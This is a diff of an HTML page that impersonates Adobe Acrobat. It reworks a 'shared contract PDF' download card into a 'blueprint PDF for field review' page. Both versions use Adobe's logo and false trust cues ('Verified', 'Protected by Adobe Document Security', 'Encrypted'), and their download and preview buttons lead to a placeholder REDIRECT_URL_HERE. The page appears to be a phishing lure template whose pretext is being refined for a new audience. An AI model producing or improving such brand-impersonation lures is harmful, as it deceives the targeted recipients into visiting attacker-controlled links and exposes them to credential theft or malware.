@@ -3,340 +3,636 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Acrobat - Shared Document</title>
+    <title>Acrobat Blueprint Review</title>
     <link rel="icon" href="https://www.adobe.com/favicon.ico">
     <style>
-        @page { size: A4; margin: 0; }
+        @page {
+            size: A4;
+            margin: 8mm;
+        }
 
         *, *::before, *::after {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+        }
+
+        :root {
+            --blueprint: #102b52;
+            --blueprint-deep: #07162d;
+            --cyan: #48d7ff;
+            --cyan-soft: rgba(72, 215, 255, 0.14);
+            --paper: #f7fbff;
+            --ink: #142033;
+            --muted: #6f7f91;
+            --line: #d8e6f2;
+            --red: #eb1000;
+            --green: #18a970;
+            --amber: #f3ad3d;
+            --shadow: rgba(7, 22, 45, 0.24);
+        }
+
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
         }
 
         body {
-            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f0f2f5;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            padding: 18px;
+            font-family: "Adobe Clean", Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            color: var(--ink);
+            background:
+                radial-gradient(circle at 16% 18%, rgba(72, 215, 255, 0.18), transparent 30%),
+                radial-gradient(circle at 86% 14%, rgba(235, 16, 0, 0.11), transparent 24%),
+                linear-gradient(135deg, #edf6ff 0%, #e6edf6 45%, #dce7f2 100%);
         }
 
-        /* Header */
-        .header {
-            background: #fff;
-            height: 54px;
+        .page-shell {
+            width: min(1060px, 100%);
+            height: calc(100vh - 36px);
+            margin: 0 auto;
+            display: grid;
+            place-items: center;
+        }
+
+        .review-board {
+            width: 100%;
+            max-height: 100%;
+            display: grid;
+            grid-template-columns: minmax(330px, 1.05fr) minmax(360px, 0.95fr);
+            overflow: hidden;
+            border: 1px solid rgba(216, 230, 242, 0.95);
+            border-radius: 32px;
+            background: rgba(247, 251, 255, 0.96);
+            box-shadow: 0 28px 82px var(--shadow);
+        }
+
+        .plan-panel {
+            position: relative;
+            min-height: min(620px, calc(100vh - 36px));
+            padding: 34px;
+            color: #fff;
+            background:
+                linear-gradient(rgba(72, 215, 255, 0.08) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(72, 215, 255, 0.08) 1px, transparent 1px),
+                linear-gradient(145deg, var(--blueprint), var(--blueprint-deep));
+            background-size: 34px 34px, 34px 34px, auto;
+            overflow: hidden;
+        }
+
+        .plan-panel::before,
+        .plan-panel::after {
+            content: "";
+            position: absolute;
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .plan-panel::before {
+            width: 280px;
+            height: 280px;
+            right: -104px;
+            top: -92px;
+            border: 46px solid rgba(72, 215, 255, 0.12);
+        }
+
+        .plan-panel::after {
+            width: 190px;
+            height: 190px;
+            left: -70px;
+            bottom: -68px;
+            background: rgba(235, 16, 0, 0.16);
+        }
+
+        .brand-row,
+        .sheet-preview,
+        .revision-strip {
+            position: relative;
+            z-index: 1;
+        }
+
+        .brand-row {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 28px;
-            border-bottom: 1px solid #e2e2e2;
+            gap: 18px;
         }
 
-        .brand {
+        .brand-lockup {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
+            font-weight: 900;
+            letter-spacing: -0.03em;
         }
 
-        .brand svg {
-            width: 24px;
-            height: 20px;
-        }
-
-        .brand span {
-            font-size: 15px;
-            font-weight: 700;
-            color: #222;
-        }
-
-        .header a {
-            font-size: 13px;
-            color: #1473e6;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .header a:hover {
-            text-decoration: underline;
-        }
-
-        /* Main */
-        .main {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 40px 20px;
-        }
-
-        .card {
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 1px 4px rgba(0,0,0,0.06), 0 6px 24px rgba(0,0,0,0.05);
-            max-width: 480px;
-            width: 100%;
-            overflow: hidden;
-        }
-
-        /* Top accent */
-        .accent-bar {
-            background: linear-gradient(135deg, #1473e6, #0b5cbf);
-            padding: 28px 32px;
-            text-align: center;
-            color: #fff;
-        }
-
-        .accent-bar .icon-wrap {
+        .brand-mark {
             width: 44px;
             height: 44px;
-            background: rgba(255,255,255,0.15);
-            border-radius: 12px;
-            margin: 0 auto 12px;
+            display: grid;
+            place-items: center;
+            border-radius: 15px;
+            background: #fff;
+            box-shadow: 0 16px 34px rgba(0, 0, 0, 0.25);
+        }
+
+        .brand-mark svg {
+            width: 25px;
+            height: 22px;
+        }
+
+        .review-tag {
+            padding: 8px 12px;
+            border: 1px solid rgba(255, 255, 255, 0.22);
+            border-radius: 999px;
+            color: rgba(255, 255, 255, 0.86);
+            font-size: 11px;
+            font-weight: 900;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+        }
+
+        .sheet-preview {
+            margin-top: 46px;
+            padding: 22px;
+            border: 1px solid rgba(72, 215, 255, 0.34);
+            border-radius: 28px;
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.04), 0 24px 52px rgba(0, 0, 0, 0.24);
+        }
+
+        .sheet-toolbar {
             display: flex;
             align-items: center;
+            justify-content: space-between;
+            margin-bottom: 18px;
+            color: rgba(255, 255, 255, 0.72);
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+        }
+
+        .sheet-status {
+            color: var(--cyan);
+        }
+
+        .blueprint-sheet {
+            position: relative;
+            min-height: 286px;
+            padding: 18px;
+            border-radius: 20px;
+            overflow: hidden;
+            background:
+                linear-gradient(rgba(72, 215, 255, 0.16) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(72, 215, 255, 0.16) 1px, transparent 1px),
+                rgba(7, 22, 45, 0.74);
+            background-size: 26px 26px;
+            border: 1px solid rgba(72, 215, 255, 0.28);
+        }
+
+        .blueprint-sheet span {
+            position: absolute;
+            display: block;
+            border-color: rgba(255, 255, 255, 0.76);
+        }
+
+        .wall-a {
+            left: 42px;
+            top: 54px;
+            width: 212px;
+            height: 132px;
+            border: 3px solid;
+        }
+
+        .wall-b {
+            left: 82px;
+            top: 88px;
+            width: 72px;
+            height: 98px;
+            border: 2px solid;
+            border-top: 0;
+        }
+
+        .wall-c {
+            left: 154px;
+            top: 88px;
+            width: 100px;
+            height: 52px;
+            border-left: 2px solid;
+            border-bottom: 2px solid;
+        }
+
+        .door-arc {
+            left: 68px;
+            top: 144px;
+            width: 44px;
+            height: 44px;
+            border: 2px solid rgba(72, 215, 255, 0.82);
+            border-left: 0;
+            border-bottom: 0;
+            border-radius: 0 44px 0 0;
+        }
+
+        .measure-x {
+            left: 42px;
+            top: 212px;
+            width: 212px;
+            height: 1px;
+            border-top: 1px dashed rgba(72, 215, 255, 0.72);
+        }
+
+        .measure-y {
+            left: 278px;
+            top: 54px;
+            width: 1px;
+            height: 132px;
+            border-left: 1px dashed rgba(72, 215, 255, 0.72);
+        }
+
+        .sheet-label {
+            position: absolute;
+            right: 18px;
+            bottom: 18px;
+            display: grid;
+            gap: 4px;
+            width: 128px;
+            padding: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.42);
+            color: #fff;
+            font-size: 10px;
+            font-weight: 800;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+        }
+
+        .sheet-label strong {
+            color: var(--cyan);
+            font-size: 16px;
+            letter-spacing: 0;
+            text-transform: none;
+        }
+
+        .revision-strip {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 18px;
+        }
+
+        .revision-item {
+            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.16);
+            border-radius: 16px;
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .revision-item span {
+            display: block;
+            color: rgba(255, 255, 255, 0.56);
+            font-size: 10px;
+            font-weight: 900;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+        }
+
+        .revision-item strong {
+            display: block;
+            margin-top: 4px;
+            color: #fff;
+            font-size: 15px;
+        }
+
+        .content-panel {
+            padding: 38px 36px;
+            display: flex;
+            flex-direction: column;
             justify-content: center;
         }
 
-        .accent-bar .icon-wrap svg {
-            width: 24px;
-            height: 24px;
+        .eyebrow {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            width: fit-content;
+            padding: 8px 12px;
+            border-radius: 999px;
+            background: var(--cyan-soft);
+            color: #087ea4;
+            font-size: 11px;
+            font-weight: 900;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
         }
 
-        .accent-bar h1 {
-            font-size: 19px;
-            font-weight: 700;
-            margin-bottom: 4px;
+        .eyebrow::before {
+            content: "";
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--green);
+            box-shadow: 0 0 0 5px rgba(24, 169, 112, 0.13);
         }
 
-        .accent-bar p {
-            font-size: 13px;
-            opacity: 0.8;
+        h1 {
+            margin-top: 20px;
+            max-width: 420px;
+            font-size: clamp(32px, 4vw, 48px);
+            line-height: 0.98;
+            letter-spacing: -0.06em;
+            color: var(--ink);
         }
 
-        /* Body */
-        .body {
-            padding: 24px 32px 32px;
+        .lede {
+            max-width: 430px;
+            margin-top: 16px;
+            color: var(--muted);
+            font-size: 15px;
+            line-height: 1.65;
         }
 
-        .file-row {
-            display: flex;
+        .file-card {
+            display: grid;
+            grid-template-columns: auto 1fr auto;
             align-items: center;
             gap: 14px;
-            padding: 14px;
-            background: #fafafa;
-            border: 1px solid #eee;
-            border-radius: 10px;
-            margin-bottom: 20px;
-        }
-
-        .file-row svg {
-            width: 40px;
-            height: 48px;
-            flex-shrink: 0;
-        }
-
-        .file-info {
-            flex: 1;
-            min-width: 0;
-        }
-
-        .file-info .name {
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-
-        .file-info .meta {
-            font-size: 11px;
-            color: #999;
-            margin-top: 2px;
-        }
-
-        .badge {
-            background: #e8f5e9;
-            color: #2e7d32;
-            font-size: 10px;
-            font-weight: 600;
-            padding: 4px 10px;
-            border-radius: 10px;
-        }
-
-        /* Stats */
-        .stats {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 24px;
-        }
-
-        .stat {
-            flex: 1;
-            text-align: center;
-            padding: 12px 8px;
-            background: #fafafa;
-            border-radius: 8px;
-        }
-
-        .stat .val {
-            font-size: 15px;
-            font-weight: 700;
-            color: #222;
-        }
-
-        .stat .lbl {
-            font-size: 10px;
-            color: #aaa;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            margin-top: 2px;
-        }
-
-        /* Button */
-        .dl-btn {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            background: #1473e6;
-            color: #fff;
-            border: none;
-            border-radius: 20px;
-            padding: 14px 24px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .dl-btn:hover {
-            background: #0d66d0;
-        }
-
-        .dl-btn svg {
-            width: 18px;
-            height: 18px;
-        }
-
-        .security-note {
-            margin-top: 16px;
-            font-size: 11px;
-            color: #b0b0b0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-        }
-
-        .security-note svg {
-            width: 13px;
-            height: 13px;
-            fill: #4caf50;
-        }
-
-        /* Footer */
-        .footer {
-            text-align: center;
+            margin-top: 26px;
             padding: 16px;
+            border: 1px solid var(--line);
+            border-radius: 22px;
+            background: #fff;
+            box-shadow: 0 16px 34px rgba(16, 43, 82, 0.08);
+        }
+
+        .pdf-tile {
+            width: 48px;
+            height: 58px;
+            display: grid;
+            place-items: end center;
+            padding-bottom: 9px;
+            border-radius: 12px;
+            color: #fff;
+            background:
+                linear-gradient(135deg, transparent 0 22%, rgba(255, 255, 255, 0.24) 22% 36%, transparent 36%),
+                var(--red);
+            font-size: 12px;
+            font-weight: 900;
+            letter-spacing: 0.04em;
+        }
+
+        .file-name {
+            font-size: 15px;
+            font-weight: 900;
+            color: var(--ink);
+        }
+
+        .file-meta {
+            margin-top: 4px;
+            color: var(--muted);
+            font-size: 12px;
+        }
+
+        .phase-chip {
+            padding: 8px 10px;
+            border-radius: 12px;
+            background: #fff7e8;
+            color: #9a6208;
             font-size: 11px;
-            color: #bbb;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
         }
 
-        .footer a {
-            color: #bbb;
+        .detail-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 18px;
+        }
+
+        .detail-card {
+            padding: 14px;
+            border: 1px solid var(--line);
+            border-radius: 18px;
+            background: rgba(255, 255, 255, 0.72);
+        }
+
+        .detail-card span {
+            display: block;
+            color: var(--muted);
+            font-size: 10px;
+            font-weight: 900;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+        }
+
+        .detail-card strong {
+            display: block;
+            margin-top: 6px;
+            font-size: 14px;
+            color: var(--ink);
+        }
+
+        .actions {
+            display: grid;
+            gap: 10px;
+            margin-top: 24px;
+        }
+
+        .action-link {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            min-height: 50px;
+            border-radius: 999px;
+            font-size: 15px;
+            font-weight: 900;
             text-decoration: none;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
         }
 
-        .footer a:hover {
-            text-decoration: underline;
+        .action-link:hover {
+            transform: translateY(-1px);
+        }
+
+        .action-link svg {
+            width: 19px;
+            height: 19px;
+        }
+
+        .primary {
+            color: #fff;
+            background: linear-gradient(135deg, #1473e6, #0d55b7);
+            box-shadow: 0 16px 34px rgba(20, 115, 230, 0.28);
+        }
+
+        .secondary {
+            color: #103d67;
+            border: 1px solid var(--line);
+            background: #fff;
+        }
+
+        .review-note {
+            margin-top: 16px;
+            padding: 14px 16px;
+            border-left: 4px solid var(--amber);
+            border-radius: 14px;
+            color: #6b557c;
+            background: #fff8e9;
+            font-size: 12px;
+            line-height: 1.55;
+        }
+
+        @media (max-width: 820px) {
+            html,
+            body {
+                height: auto;
+                overflow: auto;
+            }
+
+            .page-shell {
+                height: auto;
+            }
+
+            .review-board {
+                grid-template-columns: 1fr;
+            }
+
+            .plan-panel {
+                min-height: 560px;
+            }
         }
 
         @media print {
-            body { background: #fff; }
-            .card { box-shadow: none; border: 1px solid #ddd; }
-            .accent-bar, .dl-btn, .badge { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            body {
+                background: #fff;
+            }
+
+            .review-board,
+            .file-card {
+                box-shadow: none;
+            }
+
+            .plan-panel,
+            .primary,
+            .phase-chip,
+            .eyebrow,
+            .review-note {
+                -webkit-print-color-adjust: exact;
+                print-color-adjust: exact;
+            }
         }
     </style>
 </head>
 <body>
-    <header class="header">
-        <div class="brand">
-            <svg viewBox="0 0 30 26" fill="none">
-                <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
-                <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
-                <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
-            </svg>
-            <span>Adobe Acrobat</span>
-        </div>
-        <a href="#">Sign in</a>
-    </header>
-
-    <main class="main">
-        <article class="card">
-            <div class="accent-bar">
-                <div class="icon-wrap">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/>
-                        <polyline points="14 2 14 8 20 8"/>
-                    </svg>
-                </div>
-                <h1>Document shared with you</h1>
-                <p>Via Adobe Document Cloud</p>
-            </div>
-
-            <div class="body">
-                <div class="file-row">
-                    <svg viewBox="0 0 40 48" fill="none">
-                        <path d="M0 4C0 1.79 1.79 0 4 0H24L40 16V44C40 46.21 38.21 48 36 48H4C1.79 48 0 46.21 0 44V4Z" fill="#FDEEEE"/>
-                        <path d="M24 0L40 16H28C25.79 16 24 14.21 24 12V0Z" fill="#F5CCCC"/>
-                        <text x="20" y="34" text-anchor="middle" fill="#EB1000" font-size="9" font-weight="700" font-family="sans-serif">PDF</text>
-                    </svg>
-                    <div class="file-info">
-                        <div class="name">Contract_Agreement_2026.pdf</div>
-                        <div class="meta">Shared Apr 14, 2026</div>
+    <main class="page-shell" aria-labelledby="page-title">
+        <section class="review-board">
+            <aside class="plan-panel">
+                <div class="brand-row">
+                    <div class="brand-lockup">
+                        <div class="brand-mark" aria-hidden="true">
+                            <svg viewBox="0 0 30 26" fill="none">
+                                <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
+                                <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
+                                <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
+                            </svg>
+                        </div>
+                        <span>Acrobat Blueprint Desk</span>
                     </div>
-                    <span class="badge">Verified</span>
+                    <span class="review-tag">AEC Review</span>
                 </div>
 
-                <div class="stats">
-                    <div class="stat">
-                        <div class="val">3.6 MB</div>
-                        <div class="lbl">Size</div>
+                <div class="sheet-preview" aria-hidden="true">
+                    <div class="sheet-toolbar">
+                        <span>Sheet A-204</span>
+                        <span class="sheet-status">Issued</span>
                     </div>
-                    <div class="stat">
-                        <div class="val">9</div>
-                        <div class="lbl">Pages</div>
-                    </div>
-                    <div class="stat">
-                        <div class="val">PDF 1.7</div>
-                        <div class="lbl">Format</div>
+                    <div class="blueprint-sheet">
+                        <span class="wall-a"></span>
+                        <span class="wall-b"></span>
+                        <span class="wall-c"></span>
+                        <span class="door-arc"></span>
+                        <span class="measure-x"></span>
+                        <span class="measure-y"></span>
+                        <div class="sheet-label">
+                            <span>Level 04</span>
+                            <strong>PDF</strong>
+                            <span>Revision 08</span>
+                        </div>
                     </div>
                 </div>
 
-                <button class="dl-btn" onclick="window.location.href='REDIRECT_URL_HERE'">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
-                        <polyline points="7 10 12 15 17 10"/>
-                        <line x1="12" y1="15" x2="12" y2="3"/>
-                    </svg>
-                    Download PDF
-                </button>
-
-                <div class="security-note">
-                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-                    Protected by Adobe Document Security
+                <div class="revision-strip" aria-label="Revision summary">
+                    <div class="revision-item">
+                        <span>Markup</span>
+                        <strong>12 notes</strong>
+                    </div>
+                    <div class="revision-item">
+                        <span>Trade</span>
+                        <strong>MEP</strong>
+                    </div>
+                    <div class="revision-item">
+                        <span>Status</span>
+                        <strong>Ready</strong>
+                    </div>
                 </div>
-            </div>
-        </article>
+            </aside>
+
+            <section class="content-panel">
+                <div class="eyebrow">Construction document package</div>
+                <h1 id="page-title">Blueprint PDF ready for field review.</h1>
+                <p class="lede">The latest architectural sheet set has been packaged as a secure Acrobat PDF so project teams can download, open, or route a copy for coordination.</p>
+
+                <div class="file-card">
+                    <div class="pdf-tile" aria-hidden="true">PDF</div>
+                    <div>
+                        <div class="file-name">North_Tower_Field_Set_R08.pdf</div>
+                        <div class="file-meta">PDF document · 18.4 MB · 42 sheets · Updated May 3, 2026</div>
+                    </div>
+                    <div class="phase-chip">IFC</div>
+                </div>
+
+                <div class="detail-grid" aria-label="PDF package details">
+                    <div class="detail-card">
+                        <span>Discipline</span>
+                        <strong>Architecture</strong>
+                    </div>
+                    <div class="detail-card">
+                        <span>Revision</span>
+                        <strong>R08</strong>
+                    </div>
+                    <div class="detail-card">
+                        <span>Access</span>
+                        <strong>Encrypted</strong>
+                    </div>
+                </div>
+
+                <div class="actions" aria-label="Blueprint PDF actions">
+                    <a class="action-link primary" href="REDIRECT_URL_HERE">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                            <path d="M7 10l5 5 5-5"/>
+                            <path d="M12 15V3"/>
+                        </svg>
+                        Download blueprint PDF
+                    </a>
+                    <a class="action-link secondary" href="REDIRECT_URL_HERE" target="_blank" rel="noopener">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+                            <path d="M14 2v6h6"/>
+                            <path d="M9 15h6"/>
+                        </svg>
+                        Open sheet preview
+                    </a>
+                </div>
+
+                <p class="review-note">Direct PDF action links are embedded for reliable access from supported exported documents and project review packets.</p>
+            </section>
+        </section>
     </main>
-
-    <footer class="footer">
-        &copy; 2026 Adobe. All rights reserved. &middot;
-        <a href="#">Privacy</a> &middot;
-        <a href="#">Terms of Use</a>
-    </footer>
 </body>
 </html>
